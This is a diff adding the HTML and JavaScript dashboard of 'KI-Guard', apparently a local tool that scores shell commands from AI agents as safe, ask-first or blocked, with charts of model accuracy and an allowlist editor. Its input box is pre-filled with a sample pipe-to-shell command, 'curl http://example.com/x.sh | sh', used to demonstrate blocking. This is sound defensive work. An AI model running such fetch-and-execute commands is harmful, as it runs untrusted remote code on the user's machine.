@@ -1,0 +1,321 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>KI-Guard</title>
+<style>
+:root{--txt:#1d1d1f;--ink:#1d1d1f;--sub:rgba(0,0,0,.52);--tint:rgba(0,0,0,.04);--card:rgba(255,255,255,.55);--foot:rgba(0,0,0,.05);--hov:rgba(0,0,0,.08);
+--edge:linear-gradient(180deg,rgba(255,255,255,.95) 0%,rgba(255,255,255,.6) 20%,rgba(0,0,0,.07) 35%,rgba(0,0,0,.05) 65%,rgba(255,255,255,.6) 80%,rgba(255,255,255,.95) 100%);
+--b0:#1d1d1f;--b1:#48484d;--b2:#76767b;--b3:#a1a1a6;--b4:#c7c7cc}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;color:var(--txt);font:13px/1.45 "Segoe UI Variable","Segoe UI",Inter,system-ui,sans-serif}
+.card,.btn,.chip,.field{position:relative;isolation:isolate}
+.card::before,.btn::before,.chip::before,.field::before{content:"";position:absolute;inset:0;border-radius:inherit;padding:1px;background:var(--edge);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+.wrap{max-width:980px;margin:0 auto;padding:28px 16px;display:grid;gap:14px}
+.card{box-shadow:0 10px 40px rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04);background:var(--card);backdrop-filter:blur(5px) saturate(1.3);-webkit-backdrop-filter:blur(5px) saturate(1.3);border-radius:26px;padding:18px}
+h1{margin:0;font-size:20px;font-weight:600;letter-spacing:.02em}h2{margin:0 0 10px;font-size:12px;font-weight:600;color:var(--sub);text-transform:uppercase;letter-spacing:.12em}
+.sub{color:var(--sub)}
+.top{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.row{display:grid;grid-template-columns:260px 1fr;gap:14px}
+@media(max-width:760px){.row{grid-template-columns:1fr}}
+.tiles{display:grid;grid-template-columns:repeat(5,1fr);gap:10px}
+@media(max-width:760px){.tiles{grid-template-columns:repeat(2,1fr)}}
+.tile{background:rgba(0,0,0,.04);border-radius:18px;padding:12px 14px;cursor:pointer;transition:transform .1s,background .1s}
+.tile:hover{transform:scale(1.05);background:var(--hov)}.tile:active{transform:scale(.95)}
+.tile.on{background:rgba(0,0,0,.14)}
+.tile b{display:block;font-size:26px;font-weight:600;line-height:1.1}
+.dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px;vertical-align:1px;border:1px solid rgba(0,0,0,.35)}
+.btn{border:0;color:var(--txt);font:inherit;cursor:pointer;background:var(--foot);border-radius:15px;padding:7px 14px;transition:background .1s,transform .1s}
+.btn:hover{background:var(--hov);transform:scale(1.05)}.btn:active{transform:scale(.95)}
+.btn.s{padding:4px 10px;font-size:12px;border-radius:12px}
+.chip{display:inline-flex;align-items:center;gap:6px;background:var(--foot);border-radius:14px;padding:4px 6px 4px 12px;margin:0 6px 6px 0;font-family:Consolas,monospace;font-size:12px}
+.chip button{border:0;background:transparent;color:var(--sub);cursor:pointer;font-size:14px;border-radius:10px;width:22px;height:22px}.chip button:hover{background:var(--hov);color:var(--ink)}
+.field{width:100%;border:0;outline:0;color:var(--txt);font:12px Consolas,monospace;background:rgba(0,0,0,.045);border-radius:14px;padding:9px 12px}
+.list{display:grid;gap:6px;max-height:340px;overflow:auto;padding-right:4px}
+.item{display:grid;grid-template-columns:96px 1fr auto;gap:10px;align-items:center;background:rgba(0,0,0,.035);border-radius:14px;padding:7px 10px}
+.item code{font:12px Consolas,monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tag{font-size:11px;border-radius:10px;padding:2px 8px;background:rgba(0,0,0,.08);text-align:center}
+svg text{fill:var(--txt);font:12px "Segoe UI",sans-serif}
+#tip{position:fixed;pointer-events:none;background:rgba(255,255,255,.82);color:#1d1d1f;box-shadow:0 8px 30px rgba(0,0,0,.12);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-radius:12px;padding:7px 11px;font-size:12px;opacity:0;transition:opacity .1s;z-index:9;max-width:320px;border:1px solid rgba(0,0,0,.14)}
+.bracket{position:absolute;width:12px;height:12px;border:1px solid rgba(0,0,0,.4)}
+.empty{color:var(--sub);padding:18px;text-align:center}
+/* Simple view: big, calm, one question */
+html{background:#fff}body{background:radial-gradient(900px 600px at 15% 0%,#eef0f4 0%,transparent 60%),radial-gradient(800px 600px at 100% 100%,#f1eff4 0%,transparent 60%),#fff}[hidden]{display:none!important}
+.simple{max-width:640px;margin:0 auto;padding:56px 16px 8px;display:grid;gap:18px}
+.hero{border-radius:56px;padding:44px 40px 40px;text-align:center}
+.logo{display:inline-flex;align-items:center;gap:10px;font-size:22px;font-weight:600;letter-spacing:.01em}
+.big{font-size:44px;font-weight:300;letter-spacing:-.01em;margin:22px 0 28px;line-height:1.1}
+.bigin{width:100%;height:64px;border:0;outline:0;color:var(--txt);font:19px Consolas,monospace;background:rgba(0,0,0,.045);border-radius:22px;padding:0 22px}
+.bigbtn{width:100%;height:64px;margin-top:14px;border:0;border-radius:22px;font:600 20px "Segoe UI Variable","Segoe UI",sans-serif;color:#fff;background:#1d1d1f;cursor:pointer;transition:transform .1s}
+.bigbtn:hover{transform:scale(1.03)}.bigbtn:active{transform:scale(.95)}
+.answer{border-radius:56px;padding:34px 40px;display:grid;grid-template-columns:96px 1fr;gap:24px;align-items:center}
+.answer .ico{width:96px;height:96px;border-radius:50%;display:grid;place-items:center;background:rgba(0,0,0,.12)}
+.answer .word{font-size:40px;font-weight:600;line-height:1.05}
+.answer .say{font-size:19px;color:rgba(0,0,0,.78);margin-top:8px}
+.three{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.three .card{border-radius:40px;padding:26px 18px;text-align:center}
+.three b{display:block;font-size:46px;font-weight:300;line-height:1}
+.three span{display:block;font-size:17px;color:rgba(0,0,0,.75);margin-top:10px}
+.more{justify-self:center;font-size:17px;padding:14px 30px;border-radius:26px}
+@media(max-width:560px){.big{font-size:34px}.answer{grid-template-columns:1fr;text-align:center}.answer .ico{margin:0 auto}.three b{font-size:34px}.hero{padding:34px 20px}}
+</style></head><body>
+<div class="simple">
+  <div class="card hero">
+    <div class="logo"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="var(--ink)" stroke-width="1.8"><path d="M12 2.5 4 5.5v6c0 5 3.4 8.6 8 10 4.6-1.4 8-5 8-10v-6z"/></svg>KI-Guard</div>
+    <div class="big">Is this safe to run?</div>
+    <input class="bigin" id="try" placeholder="Paste a command here" value="curl http://example.com/x.sh | sh">
+    <button class="bigbtn" id="go">Check</button>
+  </div>
+  <div class="card answer" id="answer" hidden></div>
+  <div class="three" id="three"></div>
+  <button class="btn more" id="more">Show details</button>
+</div>
+<div class="wrap" id="expert" hidden>
+  <div class="card top">
+    <div><h1>Details</h1><div class="sub">Local guard for every AI agent · <span id="total">0</span> decisions logged</div></div>
+    <div><button class="btn" id="reload">Refresh</button></div>
+  </div>
+
+  <div class="card"><h2>How it decided</h2>
+    <div id="tryout"></div>
+  </div>
+
+  <div class="card"><div class="top" style="margin-bottom:12px"><h2 style="margin:0">Decision mode</h2><div id="modes"></div></div><div class="tiles" id="tiles"></div></div>
+
+  <div class="card"><h2>Team · how the 3 models work together</h2><div class="row" style="grid-template-columns:1fr 1fr">
+    <div><svg id="weights" viewBox="0 0 420 170" width="100%"></svg></div>
+    <div><svg id="agree" viewBox="0 0 420 170" width="100%"></svg></div></div></div>
+
+  <div class="row">
+    <div class="card"><h2>Share</h2><svg id="ring" viewBox="0 0 220 220" width="100%"></svg></div>
+    <div class="card"><h2>Per day</h2><svg id="days" viewBox="0 0 640 220" width="100%"></svg></div>
+  </div>
+
+  <div class="row">
+    <div class="card"><h2>Per AI</h2><svg id="agents" viewBox="0 0 240 200" width="100%"></svg></div>
+    <div class="card"><h2>Model on unseen attacks (holdout)</h2><svg id="proof" viewBox="0 0 640 200" width="100%"></svg></div>
+  </div>
+
+  <div class="card"><h2>Models compared · holdout, unseen attacks</h2>
+    <div id="pills" style="margin-bottom:10px"></div>
+    <div class="row" style="grid-template-columns:300px 1fr">
+      <div><svg id="calib" viewBox="0 0 300 300" width="100%"></svg><div class="sub" style="font-size:11px">Dashed = how it should be (said 30 % → 30 % really risky). Above = too careful, below = too confident.</div></div>
+      <div><svg id="mbars" viewBox="0 0 620 262" width="100%"></svg><div id="cons" style="margin-top:8px"></div></div>
+    </div>
+  </div>
+
+  <div class="card"><h2>Response time · 3 ways to run it (log scale)</h2><svg id="speeds" viewBox="0 0 900 200" width="100%"></svg></div>
+
+  <div class="card"><h2>Recent decisions <span class="sub" id="filt"></span></h2><div class="list" id="recent"></div></div>
+
+  <div class="card"><h2>Your allowlist</h2>
+    <div id="allow"></div>
+    <div style="display:flex;gap:8px;margin-top:6px"><input class="field" id="pat" placeholder="regex, e.g.  ^git push --force origin my-branch$"><button class="btn" id="add">Add</button></div>
+  </div>
+</div>
+<div id="tip"></div>
+<script>
+const B = [['blocked','Blocked','var(--b0)'],['likely','Likely risky','var(--b1)'],['unsure','Unsure','var(--b2)'],['safe','Safe','var(--b3)'],['yours','Allowed by you','var(--b4)']];
+const vs = typeof acquireVsCodeApi === 'function' ? acquireVsCodeApi() : null;
+let D = null, filter = null;
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const tip = $('tip');
+document.addEventListener('mousemove', e => { const t = e.target.closest('[data-tip]'); if (!t) { tip.style.opacity = 0; return; }
+  tip.innerHTML = t.dataset.tip; tip.style.opacity = 1; tip.style.left = Math.min(innerWidth - 330, e.clientX + 14) + 'px'; tip.style.top = (e.clientY + 14) + 'px'; });
+
+function load() { if (vs) vs.postMessage({ type: 'stats' }); else fetch('/api/stats').then(r => r.json()).then(render); }
+function saveAllow(p) { if (vs) vs.postMessage({ type: 'allow', patterns: p }); else fetch('/api/allow', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ patterns: p }) }).then(load); }
+window.addEventListener('message', e => { if (e.data && e.data.type === 'stats') render(e.data.data); });
+
+function render(d) {
+  D = d; $('total').textContent = d.total;
+  const bk = d.buckets, T = [['Stopped', bk.blocked, 'Blocked before it could run'], ['Asked you', bk.likely + bk.unsure, 'Looked risky, so it asked first'], ['Let through', bk.safe + bk.yours, 'Harmless, or allowed by you']];
+  $('three').innerHTML = T.map(([n, v, h]) => `<div class="card" data-tip="<b>${n}</b><br>${h}<br>${v} of ${d.total}"><b>${v}</b><span>${n}</span></div>`).join('');
+  const pct = k => d.total ? (100 * d.buckets[k] / d.total).toFixed(1) + ' %' : '–';
+  $('tiles').innerHTML = B.map(([k, n, c]) => `<div class="tile ${filter === k ? 'on' : ''}" data-k="${k}" data-tip="<b>${n}</b><br>${d.buckets[k]} of ${d.total} · ${pct(k)}<br><span class=sub>click to filter the list</span>"><span class="dot" style="background:${c}"></span><span class="sub">${n}</span><b>${d.buckets[k]}</b></div>`).join('');
+  document.querySelectorAll('.tile').forEach(t => t.onclick = () => { filter = filter === t.dataset.k ? null : t.dataset.k; render(D); });
+  ring(d); days(d); agents(d); proof(d); recent(d); allow(d); models(d); speeds(d); team(d);
+}
+
+const api = (u, b) => fetch(u, b ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b) } : undefined).then(r => r.json());
+const MODES = [['auto', 'Auto (vote)'], ['chars', 'Model B'], ['rules', 'Model C'], ['words', 'Model A']];
+const MNAME = { words: 'Model A · words', chars: 'Model B · characters', rules: 'Model C · words + rules' };
+let mode = 'auto';
+function modes() { $('modes').innerHTML = MODES.map(([k, n]) => `<button class="btn s" data-m="${k}" style="margin-left:6px;${mode === k ? 'background:rgba(0,0,0,.24)' : ''}" data-tip="Decide with ${n}">${n}</button>`).join('');
+  document.querySelectorAll('[data-m]').forEach(b => b.onclick = () => api('/api/settings', { mode: b.dataset.m }).then(() => { mode = b.dataset.m; modes(); tryIt(); })); }
+api('/api/settings').then(s => { mode = s.mode; modes(); }).catch(() => {});
+
+const VERB = { allow: ['Allowed', 'var(--b3)'], ask: ['Ask a person', 'var(--b1)'], block: ['Blocked', 'var(--b0)'] };
+function tryIt() {
+  const c = $('try').value.trim(); if (!c) return;
+  api('/api/check', { command: c }).then(r => {
+    const m = r.model, w = m.weights || {}, ids = Object.keys(m.models || {});
+    const bar = (n, p, wt) => `<div style="display:grid;grid-template-columns:190px 1fr 64px 52px;gap:10px;align-items:center;margin:5px 0">
+      <span class="sub">${n}</span><span style="height:10px;border-radius:5px;background:rgba(0,0,0,.07);position:relative;overflow:hidden" data-tip="<b>${n}</b><br>risk ${(p * 100).toFixed(2)} %${wt ? '<br>say in the vote: ' + wt + ' of ' + Object.values(w).reduce((a, b) => a + b, 0) : ''}">
+      <span style="position:absolute;inset:0 auto 0 0;width:${Math.max(1, p * 100)}%;background:var(--ink);border-radius:5px"></span>
+      <span style="position:absolute;top:-3px;bottom:-3px;left:${m.tAllow * 100}%;width:1px;background:rgba(0,0,0,.5)" data-tip="ask from ${(m.tAllow * 100).toFixed(1)} %"></span>
+      <span style="position:absolute;top:-3px;bottom:-3px;left:${m.tBlock * 100}%;width:2px;background:var(--ink)" data-tip="block from ${(m.tBlock * 100).toFixed(1)} %"></span></span>
+      <span>${(p * 100).toFixed(1)} %</span><span class="sub">${wt ? '×' + wt : ''}</span></div>`;
+    const v = VERB[r.level];
+    const ICO = { allow: '<path d="M5 12.5l4.5 4.5L19 7.5"/>', ask: '<path d="M9.2 9a3 3 0 1 1 3.8 2.9c-.6.2-1 .8-1 1.4V14"/><circle cx="12" cy="18" r=".6" fill="var(--ink)"/>', block: '<path d="M6 6l12 12M18 6 6 18"/>' };
+    const WORD = { allow: 'Safe', ask: 'Ask first', block: 'Stopped' };
+    const why = r.allowlisted ? 'You allowed this one yourself.' : r.rules.hits.length ? r.rules.hits[0].why + '.' :
+      r.level === 'allow' ? 'Nothing dangerous found. The AI may run it.' : r.level === 'block' ? 'Looks like an attack. It will not run.' : 'Not sure. KI-Guard asks you before it runs.';
+    const what = r.level === 'block' ? ' It will not run.' : r.level === 'ask' && r.rules.hits.length ? ' KI-Guard asks you first.' : '';
+    $('answer').hidden = false;
+    $('answer').innerHTML = `<div class="ico"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--ink)" stroke-width="2" stroke-linecap="round">${ICO[r.level]}</svg></div>
+      <div><div class="word">${WORD[r.level]}</div><div class="say">${esc(why)}${what}</div></div>`;
+    $('tryout').innerHTML = `<div style="display:flex;gap:14px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
+      <span class="tag" style="font-size:14px;padding:6px 14px;background:rgba(0,0,0,.14)"><span class="dot" style="background:${v[1]}"></span>${v[0]}</span>
+      <span class="chip" style="padding-right:12px">root: ${r.traits.needs_root ? 'yes' : 'no'}</span><span class="chip" style="padding-right:12px">undo: ${r.traits.reversible ? 'possible' : 'no'}</span>
+      <span class="chip" style="padding-right:12px">rules: ${r.rules.level}${r.rules.hits.length ? ' · ' + esc(r.rules.hits.map(h => h.id).join(', ')) : ''}</span>
+      ${r.allowlisted ? '<span class="chip" style="padding-right:12px">on your allowlist</span>' : ''}<span class="sub">${r.ms.toFixed(3)} ms</span></div>
+      ${ids.map(id => bar(MNAME[id], m.models[id], w[id])).join('')}
+      ${bar('<b style="color:var(--ink)">' + (m.mode === 'auto' ? 'Auto · weighted vote' : 'Used: ' + MNAME[m.mode]) + '</b>', m.p, 0)}`;
+  });
+}
+$('go').onclick = tryIt; $('try').onkeydown = e => { if (e.key === 'Enter') tryIt(); };
+
+function team(d) {
+  const t = d.compare && d.compare.team; if (!t) return;
+  const ids = Object.keys(t.weights).sort((a, b) => t.weights[b] - t.weights[a]), tot = ids.reduce((a, b) => a + t.weights[b], 0);
+  const lat = id => { const e = d.compare.engines.find(x => x.id === id); return e ? e.latency_ms.avg : 0; };
+  let s = `<text x="0" y="12" style="fill:var(--sub);font-size:11px">Say in the vote · best score = most, fastest = least</text>`;
+  ids.forEach((id, i) => { const y = 34 + i * 44, w = t.weights[id] / tot;
+    s += `<text x="0" y="${y}">${MNAME[id]}</text><rect x="0" y="${y + 7}" width="300" height="12" rx="6" fill="rgba(0,0,0,.06)"/>`;
+    s += `<rect x="0" y="${y + 7}" width="${300 * w}" height="12" rx="6" fill="${shade(2 + i > 4 ? 4 : 4 - i)}" data-tip="<b>${MNAME[id]}</b><br>say ${t.weights[id]} of ${tot} (${(w * 100).toFixed(0)} %)<br>eval Brier ${t.eval_brier[id].toFixed(4)}<br>speed ${lat(id).toFixed(4)} ms avg"/>`;
+    s += `<text x="310" y="${y + 18}">${(w * 100).toFixed(0)} %</text><text x="350" y="${y + 18}" style="fill:var(--sub);font-size:11px">${lat(id).toFixed(3)} ms</text>`; });
+  $('weights').innerHTML = s;
+  const n = t.all_agree + t.split, ag = t.all_agree / n, C = 2 * Math.PI * 56;
+  let a = `<circle cx="80" cy="85" r="56" fill="none" stroke="rgba(0,0,0,.08)" stroke-width="16"/>
+    <circle cx="80" cy="85" r="56" fill="none" stroke="var(--ink)" stroke-width="16" stroke-dasharray="${ag * C} ${C}" transform="rotate(-90 80 85)" data-tip="<b>All 3 agree</b><br>${t.all_agree} of ${n} holdout commands<br>right ${t.all_agree_correct} of ${t.all_agree}"/>
+    <text x="80" y="84" text-anchor="middle" style="font-size:20px;font-weight:600">${(ag * 100).toFixed(1)} %</text><text x="80" y="102" text-anchor="middle" style="fill:var(--sub);font-size:10px">all agree</text>`;
+  a += `<text x="170" y="40">When they disagree (${t.split}×)</text>`;
+  ids.forEach((id, i) => { const y = 62 + i * 26, v = t.split ? t.right_when_split[id] / t.split : 0;
+    a += `<text x="170" y="${y + 9}" style="fill:var(--sub);font-size:11px">${MNAME[id].split(' · ')[0]}</text><rect x="250" y="${y}" width="${Math.max(2, 120 * v)}" height="10" rx="5" fill="${shade(4 - i)}" data-tip="${MNAME[id]} right ${t.right_when_split[id]} of ${t.split}"/><text x="378" y="${y + 9}" style="font-size:11px">${t.right_when_split[id]}/${t.split}</text>`; });
+  const y = 62 + ids.length * 26; const v = t.split ? t.split_auto_correct / t.split : 0;
+  a += `<text x="170" y="${y + 9}" style="font-size:11px">Auto vote</text><rect x="250" y="${y}" width="${Math.max(2, 120 * v)}" height="10" rx="5" fill="var(--ink)" data-tip="Weighted vote right ${t.split_auto_correct} of ${t.split}"/><text x="378" y="${y + 9}" style="font-size:11px">${t.split_auto_correct}/${t.split}</text>`;
+  $('agree').innerHTML = a;
+}
+
+let sel = 'auto';
+const shade = i => ['#c7c7cc', '#a1a1a6', '#76767b', '#48484d', '#1d1d1f'][i];
+function models(d) {
+  const c = d.compare; if (!c) return;
+  $('pills').innerHTML = c.engines.map((e, i) => `<button class="btn s" data-e="${e.id}" style="${sel === e.id ? 'background:rgba(0,0,0,.22)' : ''};margin:0 6px 6px 0"><span class="dot" style="background:${shade(i)}"></span>${esc(e.name)}</button>`).join('');
+  document.querySelectorAll('[data-e]').forEach(b => b.onclick = () => { sel = b.dataset.e; models(D); });
+  // Calibration chart
+  const P = 34, W = 300 - P - 8, X = v => P + v * W, Y = v => 8 + (1 - v) * W;
+  let s = `<rect x="${P}" y="8" width="${W}" height="${W}" fill="rgba(0,0,0,.03)" rx="8"/>`;
+  for (const g of [0.25, 0.5, 0.75]) s += `<line x1="${X(g)}" y1="8" x2="${X(g)}" y2="${8 + W}" stroke="rgba(0,0,0,.06)"/><line x1="${P}" y1="${Y(g)}" x2="${P + W}" y2="${Y(g)}" stroke="rgba(0,0,0,.06)"/>`;
+  s += `<line x1="${X(0)}" y1="${Y(0)}" x2="${X(1)}" y2="${Y(1)}" stroke="var(--ink)" stroke-dasharray="5 5" opacity=".55" data-tip="<b>Ideal line</b><br>predicted risk = real share of risky commands"/>`;
+  c.engines.forEach((e, i) => { const on = e.id === sel; const pts = e.calibration_curve;
+    if (pts.length > 1) s += `<polyline points="${pts.map(q => X(q.predicted) + ',' + Y(q.actual)).join(' ')}" fill="none" stroke="${shade(i)}" stroke-width="${on ? 3 : 1.2}" opacity="${on ? 1 : .45}"/>`;
+    if (on) pts.forEach(q => s += `<circle cx="${X(q.predicted)}" cy="${Y(q.actual)}" r="${3 + Math.min(6, Math.log10(q.n + 1) * 2)}" fill="${shade(i)}" data-tip="<b>${esc(e.name)}</b><br>says ${(q.predicted * 100).toFixed(1)} % risky<br>really ${(q.actual * 100).toFixed(1)} % risky<br>${q.n} commands"/>`); });
+  s += `<text x="${P + W / 2}" y="298" text-anchor="middle" style="fill:var(--sub);font-size:10px">predicted risk →</text><text x="10" y="${8 + W / 2}" transform="rotate(-90 10 ${8 + W / 2})" text-anchor="middle" style="fill:var(--sub);font-size:10px">really risky →</text>`;
+  $('calib').innerHTML = s;
+  // Metric bars: all engines, selected bright
+  const mets = [['Attacks caught', 'recall', 1, 'higher is better'], ['Ranking (AUC)', 'auc', 1, 'higher is better'], ['Honest odds (1 − Brier×5)', 'brier', -1, 'higher is better'], ['False alarms', 'false_alarm_rate', 0, 'lower is better']];
+  let m = '';
+  mets.forEach(([n, k, dir, hint], j) => { const y = 14 + j * 64; m += `<text x="0" y="${y}">${n} <tspan style="fill:var(--sub);font-size:10px">${hint}</tspan></text>`;
+    c.engines.forEach((e, i) => { const raw = e[k]; const v = dir === -1 ? Math.max(0, 1 - raw * 5) : dir === 0 ? Math.min(1, raw * 20) : raw;
+      const on = e.id === sel, h = on ? 6 : 4, yy = y + 8 + i * 8;
+      m += `<rect x="0" y="${yy}" width="${Math.max(2, 520 * v)}" height="${h}" rx="3" fill="${shade(i)}" opacity="${on ? 1 : .5}" data-tip="<b>${esc(e.name)}</b><br>${n}: ${k === 'auc' ? raw.toFixed(4) : k === 'brier' ? 'Brier ' + raw.toFixed(4) : (raw * 100).toFixed(2) + ' %'}"/>`;
+      if (on) m += `<text x="${528 + 0}" y="${yy + 7}" style="font-size:11px">${k === 'auc' ? raw.toFixed(3) : k === 'brier' ? raw.toFixed(4) : (raw * 100).toFixed(1) + ' %'}</text>`; }); });
+  $('mbars').innerHTML = m;
+  const e = c.engines.find(x => x.id === sel);
+  $('cons').innerHTML = `<span class="sub" style="margin-right:6px">Downsides:</span>` + e.cons.map(x => `<span class="chip" style="padding-right:12px">${esc(x)}</span>`).join('') +
+    `<span class="chip" style="padding-right:12px" data-tip="avg ${e.latency_ms.avg.toFixed(4)} ms<br>p50 ${e.latency_ms.p50.toFixed(4)} · p95 ${e.latency_ms.p95.toFixed(4)}<br>best ${e.latency_ms.best.toFixed(4)} ms">⏱ ${e.latency_ms.avg.toFixed(4)} ms avg</span>`;
+}
+
+function speeds(d) {
+  const c = d.compare; if (!c || !c.speeds) return;
+  const lo = Math.log10(0.001), hi = Math.log10(200), X = v => 230 + (Math.log10(Math.max(0.001, v)) - lo) / (hi - lo) * 560;
+  let s = '';
+  for (const t of [0.001, 0.01, 0.1, 1, 10, 100]) s += `<line x1="${X(t)}" y1="6" x2="${X(t)}" y2="168" stroke="rgba(0,0,0,.07)"/><text x="${X(t)}" y="186" text-anchor="middle" style="fill:var(--sub);font-size:10px">${t} ms</text>`;
+  c.speeds.forEach((sp, i) => { const y = 22 + i * 52;
+    s += `<text x="0" y="${y + 4}">${esc(sp.name)}</text><text x="0" y="${y + 20}" style="fill:var(--sub);font-size:11px">avg ${sp.avg.toFixed(3)} ms · n ${sp.n}</text>`;
+    s += `<line x1="${X(sp.best)}" y1="${y + 6}" x2="${X(sp.p95)}" y2="${y + 6}" stroke="rgba(0,0,0,.35)" stroke-width="2"/>`;
+    s += `<rect x="${X(sp.best) - 1}" y="${y - 2}" width="2" height="16" fill="#9a9aa0" data-tip="best ${sp.best.toFixed(3)} ms"/>`;
+    s += `<rect x="${X(sp.p95) - 1}" y="${y - 2}" width="2" height="16" fill="#9a9aa0" data-tip="p95 ${sp.p95.toFixed(3)} ms"/>`;
+    s += `<circle cx="${X(sp.p50)}" cy="${y + 6}" r="6" fill="var(--ink)" data-tip="<b>${esc(sp.name)}</b><br>best ${sp.best.toFixed(3)} ms<br>median ${sp.p50.toFixed(3)} ms<br>average ${sp.avg.toFixed(3)} ms<br>p95 ${sp.p95.toFixed(3)} ms"/>`;
+    s += `<rect x="${X(sp.avg) - 4}" y="${y + 2}" width="8" height="8" transform="rotate(45 ${X(sp.avg)} ${y + 6})" fill="none" stroke="var(--ink)" data-tip="average ${sp.avg.toFixed(3)} ms"/>`; });
+  s += `<text x="230" y="198" style="fill:var(--sub);font-size:10px">● median  ◇ average  | best … p95 |</text>`;
+  $('speeds').innerHTML = s;
+}
+
+function ring(d) {
+  const cx = 110, cy = 110, r = 80, C = 2 * Math.PI * r; let off = 0, s = '';
+  s += `<circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="rgba(0,0,0,.06)" stroke-width="22"/>`;
+  for (const [k, n, c] of B) { const v = d.total ? d.buckets[k] / d.total : 0; if (!v) continue;
+    s += `<circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="${c}" stroke-width="22" stroke-dasharray="${v * C} ${C}" stroke-dashoffset="${-off}" transform="rotate(-90 ${cx} ${cy})" data-tip="<b>${n}</b><br>${d.buckets[k]} · ${(v * 100).toFixed(1)} %" style="cursor:pointer"/>`; off += v * C; }
+  const stopped = d.buckets.blocked + d.buckets.likely + d.buckets.unsure;
+  s += `<text x="${cx}" y="${cy - 4}" text-anchor="middle" style="font-size:30px;font-weight:600">${stopped}</text><text x="${cx}" y="${cy + 18}" text-anchor="middle" style="fill:var(--sub)">stopped or asked</text>`;
+  $('ring').innerHTML = s;
+}
+
+function stackBars(el, rows, W, H, labelW) {
+  const max = Math.max(1, ...rows.map(r => B.reduce((a, [k]) => a + r.v[k], 0)));
+  return rows;
+}
+
+function days(d) {
+  const ks = Object.keys(d.days).filter(Boolean).sort().slice(-14), W = 640, H = 220, pad = 28;
+  if (!ks.length) { $('days').innerHTML = `<text x="320" y="110" text-anchor="middle" style="fill:var(--sub)">No decisions yet</text>`; return; }
+  const max = Math.max(1, ...ks.map(k => B.reduce((a, [b]) => a + d.days[k][b], 0)));
+  const bw = Math.min(40, (W - pad * 2) / ks.length - 8); let s = '';
+  ks.forEach((k, i) => { const x = pad + i * ((W - pad * 2) / ks.length) + 4; let y = H - pad;
+    const tot = B.reduce((a, [b]) => a + d.days[k][b], 0);
+    for (const [b, n, c] of B) { const h = (d.days[k][b] / max) * (H - pad * 2); if (!h) continue; y -= h;
+      s += `<rect x="${x}" y="${y}" width="${bw}" height="${h}" rx="5" fill="${c}" data-tip="<b>${k}</b><br>${n}: ${d.days[k][b]} of ${tot}"/>`; }
+    s += `<text x="${x + bw / 2}" y="${H - 8}" text-anchor="middle" style="fill:var(--sub);font-size:10px">${k.slice(5)}</text>`; });
+  $('days').innerHTML = s;
+}
+
+function agents(d) {
+  const ks = Object.keys(d.agents); let s = '';
+  if (!ks.length) { $('agents').innerHTML = ''; return; }
+  ks.slice(0, 6).forEach((a, i) => { const v = d.agents[a], tot = B.reduce((x, [b]) => x + v[b], 0); let x = 0; const y = 14 + i * 31;
+    s += `<text x="0" y="${y}" style="font-size:11px">${esc(a)} <tspan style="fill:var(--sub)">· ${tot}</tspan></text>`;
+    for (const [b, n, c] of B) { const w = (v[b] / tot) * 240; if (!w) continue; s += `<rect x="${x}" y="${y + 5}" width="${w}" height="9" rx="4" fill="${c}" data-tip="<b>${esc(a)}</b><br>${n}: ${v[b]} of ${tot}"/>`; x += w; } });
+  $('agents').innerHTML = s;
+}
+
+function proof(d) {
+  if (!d.model) { $('proof').innerHTML = `<text x="320" y="100" text-anchor="middle" style="fill:var(--sub)">Run npm run reproduce</text>`; return; }
+  const m = d.model.holdout, r = d.model.rules, q = d.model.queue;
+  const rows = [['Attacks caught (recall)', m.recall, r.recall], ['Ranking quality (AUC)', m.auc, r.auc], ['Decided automatically', q.automated_share, null]];
+  let s = '';
+  rows.forEach(([n, a, b], i) => { const y = 20 + i * 58;
+    s += `<text x="0" y="${y}">${n}</text>`;
+    s += `<rect x="0" y="${y + 8}" width="520" height="12" rx="6" fill="rgba(0,0,0,.06)"/><rect x="0" y="${y + 8}" width="${520 * a}" height="12" rx="6" fill="var(--b0)" data-tip="<b>KI-Guard model</b><br>${n}: ${(a * 100).toFixed(2)} %<br><span class=sub>holdout, n = ${m.n}, unseen attack scenarios</span>"/>`;
+    s += `<text x="530" y="${y + 19}">${(a * 100).toFixed(1)} %</text>`;
+    if (b != null) s += `<rect x="0" y="${y + 24}" width="${Math.max(2, 520 * b)}" height="6" rx="3" fill="var(--b3)" data-tip="<b>Regex rules only</b><br>${n}: ${(b * 100).toFixed(2)} %"/><text x="530" y="${y + 32}" style="fill:var(--sub);font-size:11px">rules ${(b * 100).toFixed(1)} %</text>`;
+  });
+  $('proof').innerHTML = s;
+}
+
+function recent(d) {
+  const r = d.recent.filter(e => !filter || e.bucket === filter);
+  $('filt').textContent = filter ? '· ' + B.find(b => b[0] === filter)[1] : '';
+  if (!r.length) { $('recent').innerHTML = `<div class="empty">Nothing here yet</div>`; return; }
+  $('recent').innerHTML = r.map((e, i) => { const n = B.find(b => b[0] === e.bucket);
+    return `<div class="item"><span class="tag" data-tip="${esc(n[1])}${e.p != null ? '<br>Model risk ' + (e.p * 100).toFixed(1) + ' %' : ''}<br>Rules: ${esc(e.hits.join(', ') || '–')}"><span class="dot" style="background:${n[2]}"></span>${n[1]}</span>
